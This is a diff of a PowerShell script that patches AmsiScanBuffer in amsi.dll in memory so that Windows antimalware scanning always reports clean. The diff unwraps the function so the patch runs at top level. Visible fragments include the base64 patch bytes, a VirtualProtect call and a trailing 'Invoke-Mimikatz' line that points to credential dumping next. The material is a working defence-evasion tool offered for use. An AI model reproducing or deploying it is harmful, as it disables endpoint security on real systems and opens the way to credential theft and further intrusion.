@@ -1,10 +1,8 @@
-function GlobalAMSIBypass {
 <#
     .SYNOPSIS
         Performs a global AMSI bypass by patching amsi.dll in memory.
     .DESCRIPTION
-        This function modifies the AmsiScanBuffer function in amsi.dll to always
-        return AMSI_RESULT_CLEAN, affecting all AMSI scanning within the current process.
+        This function modifies the AmsiScanBuffer function in amsi.dll to always return AMSI_RESULT_CLEAN, affecting all AMSI scanning within the current process.
     .LINK
      https://github.com/Chainski/GlobalAMSIBypass
 #>
@@ -41,6 +39,4 @@ $patchBytes = ([Convert]::FromBase64String('SDHA'))
 Write-Host "[*] Restoring memory protection to PAGE_EXECUTE_READ" 
 $vp.Invoke($funcAddr2, 3, 0x20, [ref]$oldProtectionBuffer) | out-null
 Write-Host "[!] Global AMSI bypass completed successfully!"
-}
-GlobalAMSIBypass
 Write-Host "[!] Invoke-Mimikatz" -ForeGroundColor Green
